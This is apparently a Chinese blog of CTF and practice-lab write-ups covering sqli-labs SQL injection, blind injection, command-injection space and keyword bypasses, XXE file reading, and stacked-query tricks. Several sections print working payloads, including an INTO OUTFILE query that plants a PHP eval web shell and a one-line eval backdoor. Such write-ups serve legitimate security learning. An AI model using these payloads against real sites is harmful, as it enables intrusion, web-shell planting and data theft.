+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	if($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;	</span><br><span class="line">  	echo &#x27;You are in.... Use outfile......&#x27;;</span><br><span class="line">  	echo &quot;&lt;br&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	else </span><br><span class="line">	&#123;</span><br><span class="line">	echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">	echo &#x27;You have an error in your SQL syntax&#x27;;</span><br><span class="line">	//print_r(mysql_error());     //输出错误信息这一行被注释掉了，所以不能用报错注入</span><br><span class="line">	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>于是想起题目提示：use outfile</p>
+<p>注意：使用这个功能需要提前开启权限。你可以前往MySQL的源文件目录中，<br>	打开my.ini配置文件，并修改其中的<code>secure_file_priv=&#39;D://&#39;</code><br>	参数设置为你的安全目录。(请设置为C盘以外的磁盘，避免系统权限问题。)<br>	修改完成并重启后在MySQL命令行中输入<code>show variables like &#39;%secure%&#39;;</code>查看是否设置成功。</p>
+<p>但是有使用条件：</p>
+<p>​	1.你有没有权限</p>
+<p>​	2.你知道你写入的文件在哪里（网站在服务器上的绝对路径）</p>
+<p>​	找法：Web 路径只能通过：读源码、猜默认目录、或从数据库配置反推。</p>
+<p>​	用靶场第二关来获得绝对路径。@@basedir()是安装MYSQL的安装路径 ，@@datadir()是安装MYSQL的数据文件路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,@@basedir,@@datadir</span><br><span class="line">    basedir()指定了安装MYSQL的安装路径</span><br><span class="line">    datadir()指定了安装MYSQL的数据文件路径</span><br></pre></td></tr></table></figure>
+
+<p>使用木马：</p>
+<p>select 内容 into outfile</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select 1,2,&#x27;&lt;?php eval(@$_POST[&quot;cmd&#x27;&quot;]);?&gt;&#x27; into outfile&quot;F:\\phpstudy_pro\\WWW\\sqli-labs\\less-7\\hack.php&quot;--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3.连接yijian，获得wedshell权限</p>
+<h2 id="sqli-8-题解（布尔盲注）"><a href="#sqli-8-题解（布尔盲注）" class="headerlink" title="sqli-8 题解（布尔盲注）"></a>sqli-8 题解（布尔盲注）</h2><h6 id="方法一：手搓"><a href="#方法一：手搓" class="headerlink" title="方法一：手搓"></a>方法一：手搓</h6><p>1.前期准备：</p>
+<p>判断注入类型，字段个数（没有显示位，字符型注入）</p>
+<p>2.布尔盲注</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://286a3ec8-212c-4ea7-bb63-f896372bbe7e.node5.buuoj.cn/Less-8/?id=1">http://286a3ec8-212c-4ea7-bb63-f896372bbe7e.node5.buuoj.cn/Less-8/?id=1</a>‘“ -D security -T users -C username,password –dump –batch</p>
+<p>步骤1：判断数据库长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length(database())&gt;1--+   //正常</span><br><span class="line">?id=1&#x27; and length(database())&gt;10--+  //报错</span><br><span class="line">?id=1&#x27; and length(database())&gt;5--+   //正常</span><br><span class="line">?id=1&#x27; and length(database())&gt;8--+   //报错</span><br><span class="line">?id=1&#x27; and length(database())&gt;7--+   //正常</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>&#x27; and <span class="built_in">length</span>(database())=<span class="number">8</span> --+</span><br></pre></td></tr></table></figure>
+
+<p>步骤2：数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((database()),1,1)) &gt;100 --+   //正常</span><br><span class="line">?id=1&#x27; and ascii(substr((database()),1,1)) &gt;110 --+   //正常</span><br><span class="line">?id=1&#x27; and ascii(substr((database()),1,1)) &gt;114 --+   //正常</span><br><span class="line">?id=1&#x27; and ascii(substr((database()),1,1)) &gt;115 --+   //报错</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((database()),1,1)) =115 --+</span><br></pre></td></tr></table></figure>
+
+<p>115对应的的是s，继续猜测剩下的字母</p>
+<p>得database&#x3D;’security’</p>
+<p>步骤3：判断表的数量</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1&#x27;</span> <span class="keyword">and</span> (<span class="function"><span class="keyword">select</span> <span class="title">count</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database())=<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>
+
+<p>步骤4：表名</p>
+<p>判断表长度</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1&#x27;</span> <span class="function"><span class="keyword">and</span> <span class="title">length</span>(<span class="params">(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database(</span>) limit 0,1))</span>=<span class="number">6</span>--+</span><br></pre></td></tr></table></figure>
+
+<p>。。。。。。。太多了，不如用sqlmap</p>
+<p>但要大致学会原理：</p>
+<h4 id="一、布尔盲注"><a href="#一、布尔盲注" class="headerlink" title="一、布尔盲注"></a>一、布尔盲注</h4><p>布尔盲注是一种基于布尔逻辑的盲注方法。</p>
+<p>在sqli-labs的第八关中，我们可以尝试使用布尔盲注来获取管理员的密码。首先，我们需要找到注入点，然后构造一个类似于以下的查询语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND (SELECT * FROM users WHERE username=&#x27;admin&#x27;)=1 --</span><br></pre></td></tr></table></figure>
+
+<p>如果上述查询语句返回结果集，说明“admin”这个用户名存在于用户表中。接着，我们可以尝试构造一个包含密码猜测的查询语句，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND (SELECT * FROM users WHERE username=&#x27;admin&#x27; AND password=&#x27;password&#x27;)=1 --</span><br></pre></td></tr></table></figure>
+
+<p>如果返回结果集，说明我们猜测的密码可能是正确的。通过不断尝试不同的密码，最终可以获取到管理员的密码。</p>
+<h4 id="二、时间盲注"><a href="#二、时间盲注" class="headerlink" title="二、时间盲注"></a>二、时间盲注</h4><p>时间盲注是一种基于时间差的盲注方法。</p>
+<p>在sqli-labs的第九关中，我们可以尝试使用时间盲注来获取管理员的密码。首先，我们需要找到注入点，然后构造一个类似于以下的查询语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(SUBSTRING(password,1,1)=&#x27;a&#x27;, SLEEP(5), 0) --</span><br></pre></td></tr></table></figure>
+
+<p>上述查询语句会判断密码的第一位是否为字母“a”，如果是，则执行一个延时5秒的函数（SLEEP）。通过观察返回结果集的时间差，如果延时超过5秒，说明密码的第一位可能是字母“a”。接着，我们可以尝试其他字符，并观察时间差的变化，最终可以获取到管理员的密码。</p>
+<p>很多时候不推荐使用</p>
+<p>方法二：sqlmap</p>
+<p>方法三：抓包</p>
+<p>数据库常用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and substr(database(),&#123;&#123;int(1-32)&#125;&#125;,1)=&#x27;&#123;&#123;list(a|b|c|0|1|_)&#125;&#125;&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="GXYCTF2019-Ping-Ping-Ping-1-题解"><a href="#GXYCTF2019-Ping-Ping-Ping-1-题解" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1 题解"></a>[GXYCTF2019]Ping Ping Ping 1 题解</h2><p>&#x2F;?ip&#x3D;<br>提示我们输入关于ip的命令，明显就是ping喽<br>url后加127.0.0.1，ping通了</p>
+<p>然后ls，会发现直接显示出了flag.php<br>尝试cat查看，发现显示<br>&#x2F;?ip&#x3D; fxck your space!<br>啥玩意，明显不让我们看，为什么呢？因为space空格，那我们替换空格。用可以填写能够代替空的某些专业术语就行</p>
+<p>1、命令绕过空格方法有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;$9</span><br><span class="line">&#123;IFS&#125;</span><br><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2.有时会禁用cat:<br>解决方法是使用tac反向输出命令：</p>
+<p>这个真的很有趣，比如内容是1，2，3<br>tac输出的是3，2，1<br>我觉得好可爱</p>
+<p>切入正题：</p>
+<p>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat$IFS$1flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>得到：<br>&#x2F;?ip&#x3D; fxck your flag!<br>诶哟，怎么flag也不行<br>那就制造一个不一样的flag<br>需要用到变量，比如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;a=g;fla$a</span><br></pre></td></tr></table></figure>
+
+
+<p>试试看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>
+
+
+<p>得到flag</p>
+<h2 id="攻防世界-robots-题解"><a href="#攻防世界-robots-题解" class="headerlink" title="攻防世界 robots 题解"></a>攻防世界 robots 题解</h2><p>抓包得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&lt;/h1&gt;</span><br><span class="line">&lt;!--flag is not here--&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>url跟上&#x2F;robots.txt</p>
+<p>返回：</p>
+<p>User-agent: *<br>Disallow:<br>Disallow: f1ag_1s_h3re.php</p>
+</li>
+<li><p>url跟上&#x2F;f1ag_1s_h3re.php</p>
+</li>
+</ol>
+<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><h3 id="1题解"><a href="#1题解" class="headerlink" title="1题解"></a>1题解</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><h4 id="1-PIPES-AS-CONCAT：将-或运算符-转换为-连接字符，即将-前后拼接到一起。"><a href="#1-PIPES-AS-CONCAT：将-或运算符-转换为-连接字符，即将-前后拼接到一起。" class="headerlink" title="1.PIPES_AS_CONCAT：将 || 或运算符 转换为 连接字符，即将||前后拼接到一起。"></a>1.<strong>PIPES_AS_CONCAT：将 || 或运算符 转换为 连接字符，即将||前后拼接到一起。</strong></h4><p>把||变成字符串连接符，而不是或</p>
+<p>涉及到mysql中sql_mode参数设置，设置 sql_mode&#x3D;pipes_as_concat字符就可以设置。</p>
+<p>即set sql_mode&#x3D;ppipes_as_concat</p>
+<h4 id="2-select语法"><a href="#2-select语法" class="headerlink" title="2. select语法"></a>2. select语法</h4><h5 id="2-1搜索用法（查数据库里的数据）——-不存在会报错"><a href="#2-1搜索用法（查数据库里的数据）——-不存在会报错" class="headerlink" title="2.1搜索用法（查数据库里的数据）—— 不存在会报错"></a>2.1搜索用法（查数据库里的数据）—— 不存在会报错</h5><p>如果 <code>select</code> 后面跟的是 <strong>数据库中的表、字段</strong>，那确实是 “搜索”，找不到就会报错：</p>
+<h5 id="2-2-输出用法（打印常量-表达式）——-永远不报错，和数据库数据无关"><a href="#2-2-输出用法（打印常量-表达式）——-永远不报错，和数据库数据无关" class="headerlink" title="2.2 输出用法（打印常量 &#x2F; 表达式）—— 永远不报错，和数据库数据无关"></a>2.2 输出用法（打印常量 &#x2F; 表达式）—— 永远不报错，和数据库数据无关</h5><p>如果 <code>select</code> 后面跟的是 <strong>常量（1、’abc’）、数学表达式（1+2）</strong>，那它就像 “echo”，直接输出结果，根本不依赖数据库里的任何数据：</p>
+<ul>
+<li><p>例子 1：<code>select 1;</code> → 输出 1（和数据库里有没有表、有没有数据无关）；</p>
+</li>
+<li><p>例子 2：<code>select 1+2*3;</code> → 输出 7（SQL 直接计算表达式，不用查数据库）；</p>
+</li>
+<li><h6 id="例子-3：select-hello-→-输出-hello（字符串常量，天生存在）。"><a href="#例子-3：select-hello-→-输出-hello（字符串常量，天生存在）。" class="headerlink" title="例子 3：select &#39;hello&#39;; → 输出 hello（字符串常量，天生存在）。"></a>例子 3：<code>select &#39;hello&#39;;</code> → 输出 hello（字符串常量，天生存在）。</h6></li>
+</ul>
+<p>进入后显示：<br>Give me your flag, I will tell you if the flag is right.</p>
+<p>1.输入以下语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1;desc `FLAG_TABLE`</span><br><span class="line">得：Nonono.</span><br><span class="line"></span><br><span class="line">1;show column from `FLAG_TABLE`</span><br><span class="line">得：Nonono.</span><br><span class="line"></span><br><span class="line">1; show databases;</span><br><span class="line">得：Nonono.</span><br></pre></td></tr></table></figure>
+
+<p>观察一下这些语句：</p>
+<p>1;一堆语句               </p>
+<p>疑问：为什么要加1</p>
+<p>因为我们猜测后端语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $_POST[<span class="string">&#x27;query&#x27;</span>] <span class="operator">||</span> flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>后端：</p>
+<p>select $_POST[‘query’] || flag from Flag;</p>
+<p>如果直接输入：show databases;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select show databases|| flag from Flag;</span><br></pre></td></tr></table></figure>
+
+<p>不符合语法，你都没有用到select语句，就直接跟show了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>; <span class="keyword">show</span> databases<span class="operator">||</span> flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure>
+
+<p>这样输入之后语法正确</p>
+<p>2.1继续输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show columns from Flag;#</span><br></pre></td></tr></table></figure>
+
+<p>Nonono.</p>
+<h4 id="思路一：输入payload（精心设计的恶意语句），然后把-看成拼接"><a href="#思路一：输入payload（精心设计的恶意语句），然后把-看成拼接" class="headerlink" title="思路一：输入payload（精心设计的恶意语句），然后把||看成拼接"></a>思路一：输入payload（精心设计的恶意语句），然后把||看成拼接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 || flag from Flag</span><br></pre></td></tr></table></figure>
+
+<p>这句话是：先搜索1，然后再搜索flag，再把俩值拼接起来</p>
+<p>输入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>; sql_mode<span class="operator">=</span>PIPES_AS_CONCAT; <span class="operator">||</span> flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure>
+
+<p><code>||</code> 前面没有任何操作，会导致语法错误！</p>
+<p>所以末尾再加上select 1;</p>
+<p>而且别忘记加上后末尾不要跟；  否则也会导致||前面没有任何操作</p>
+<p>变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;sql_mode=PIPES_AS_CONCAT;select 1  //不行，改变参数要用set</span><br><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1  //成功</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="moectf-2025-05-第五章-打上门来！"><a href="#moectf-2025-05-第五章-打上门来！" class="headerlink" title="moectf 2025 05 第五章 打上门来！"></a>moectf 2025 05 第五章 打上门来！</h2><p>题目关键词：穿梭在文件目录</p>
+<p>即 在文件目录中寻找flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./ 当前目录</span><br><span class="line">../上一级目录</span><br></pre></td></tr></table></figure>
+
+<p>在当前目录发现给我们的所有内容中并没有flag，说明：在这些文件目录的下一级</p>
+<p>于是我们输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../flag</span><br></pre></td></tr></table></figure>
+
+<p>错了</p>
+<p>寻找是否在 下一级目录的下一级中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../falg</span><br></pre></td></tr></table></figure>
+
+<p>以此类推</p>
+<p>直到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../flag</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p>典型的 XXE 注入漏洞 题目</p>
+<p>知识点准备：</p>
+<ol>
+<li><p>XXE：XML 外部实体注入（当成sql注入看就行）</p>
+</li>
+<li><p>XML：&lt;标签&gt; 格式</p>
+</li>
+<li><p>file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;………….</p>
+<p>linux结构</p>
+</li>
+</ol>
+<p>通用格式</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 任意名字 [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY 实体名 <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///文件绝对路径&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">网站接收的标签名</span>&gt;</span>&amp;实体名;<span class="tag">&lt;/<span class="name">网站接收的标签名</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>第一步：</p>
+<p>一进去发现有个大方框让你提交东西，随便写一个啥提交，得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  DOMDocument::loadXML(): Start tag expected, &#x27;&amp;lt;&#x27; not found in Entity, line: 1 in &lt;b&gt;/var/www/html/chapter10.php&lt;/b&gt; on line &lt;b&gt;17&lt;/b&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;阵枢&gt;引魂玉&lt;/阵枢&gt;</span><br><span class="line">&lt;解析&gt;未定义&lt;/解析&gt;</span><br><span class="line">&lt;输出&gt;未定义&lt;/输出&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析：</p>
+<p>1.<b>Warning</b>:  DOMDocument::loadXML(): Start tag expected, ‘&lt;’ not found in Entity</p>
+<p>说明：第一，我们没有按照他所希望的格式注入：’&lt;’（也就是’&amp;lt’）</p>
+<p>2.&lt;输出&gt;未定义&lt;&#x2F;输出&gt;</p>
+<p>说明：第二，很明显了，格式是xml</p>
+<p>第二，我们需要在这里获取flag内容</p>
+<p>所以，这个会被后面用到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;网站要求的标签&gt;&amp;x;&lt;/网站要求的标签&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3.&#x2F;var&#x2F;www&#x2F;html&#x2F;chapter10.php</p>
+<p>很明显，linux文件夹结构，也许flag就在这里面</p>
+<p>可以改成：&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt</p>
+<p>第二步：</p>
+<p>输入对应格式的注入，拿到flag</p>
+<p>固定格式：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 任意名字 [<span class="meta">&lt;!ENTITY 实体名 <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///文件绝对路径&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">网站接收的标签名</span>&gt;</span>&amp;实体名;<span class="tag">&lt;/<span class="name">网站接收的标签名</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE A [</span><br><span class="line">&lt;!ENTITY x SYSTEM &quot;file:///要读的文件路径&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;网站要求的标签&gt;&amp;x;&lt;/网站要求的标签&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>  //可以不写</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 输出 [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/html/doLogin.php&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">输出</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">输出</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>用<code>&amp;实体名;</code>的格式引用刚才定义的<code>flag</code>实体；</p>
+<!DOCTYPE 输出 [
+<!ENTITY flag SYSTEM "file:///var/www/html/flag.txt"><p>]&gt;<br>&lt;输出&gt;&flag;&lt;&#x2F;输出&gt;</p>
+<h2 id="MoeCTF-2025-12-第十二章-玉魄玄关·破妄"><a href="#MoeCTF-2025-12-第十二章-玉魄玄关·破妄" class="headerlink" title="MoeCTF 2025 12 第十二章 玉魄玄关·破妄"></a>MoeCTF 2025 12 第十二章 玉魄玄关·破妄</h2><p>1.一进入，看到了一句话木马</p>
+<p>然后题解写着：一句话木马和flag在环境变量中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">@eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>2.直接蚁剑连接，连接虚拟终端</p>
+<p>![](&#x2F;images&#x2F;屏幕截图 2025-11-17 223714.png)</p>
+<p>发现啊linux系统，我们要在里面找flag</p>
+<p>直接输入：env |grep -i flag</p>
+<p>-i选项：不分大小写grep过滤</p>
+<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><h3 id="1题解-1"><a href="#1题解-1" class="headerlink" title="1题解"></a>1题解</h3><p>1.进去使用万能密码，登陆成功，<strong>发现一段乱码提交发现错误，这并不是flag</strong></p>
+<p>原url：&#x2F;check.php?username&#x3D;1’+or+1%3D1%23&amp;password&#x3D;55</p>
+<p>2.输入1-4，4处报错，说明没有第四个字段</p>
+<p>（在输入1-3时他说你密码错误不要慌，你只是在找字段，只要他能正常显示说明此字段存在）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1&#x27; order by 4%23&amp;password=ads</span><br></pre></td></tr></table></figure>
+
+<p>3.寻找注入点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,2,3%23&amp;password=ads</span><br></pre></td></tr></table></figure>
+
+<p>​						 					</p>
+<p>返回2，3；</p>
+<p>说明这两处为注入点</p>
+<p>4.寻找数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,database(),3%23&amp;password=ads</span><br></pre></td></tr></table></figure>
+
+<p> 其中，3%23&amp;password&#x3D;ads</p>
+<p>​	3是占位用的，没啥意义</p>
+<p>​	%23是# ；</p>
+<p> 其次,为什么#后面还要输出，不是都注释掉了吗？</p>
+<p>​	因为**<code>#</code> 是 SQL 里的注释符，但它管不到 URL 的参数格式 —— 网站要求必须传 <code>password</code> 参数，所以得用 <code>&amp;password=ads</code> 补全格式，否则网站可能直接拒绝请求**	</p>
+<p>​	返回：Hello geek！</p>
+<p>​	得到数据库：geek</p>
+<p>5.寻找表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=ads</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong><code>group_concat</code></strong>：“分组拼接”，MySQL 的聚合函数，把多行结果拼接成一个字符串（用逗号分隔）</p>
+</li>
+<li><p><code>group_concat(table_name)</code>：把所有表名拼接成一个字符串返回（方便查看）；</p>
+</li>
+<li><p>table_schema：表所属数据库名</p>
+</li>
+<li><p><code>table_schema=database()</code>：限定只查当前连接的数据库的表。</p>
+</li>
+</ul>
+<p>​	返回：Your password is ‘geekuser,l0ve1ysq1’</p>
+<p>​	说明表名：geekuser,l0ve1ysq1</p>
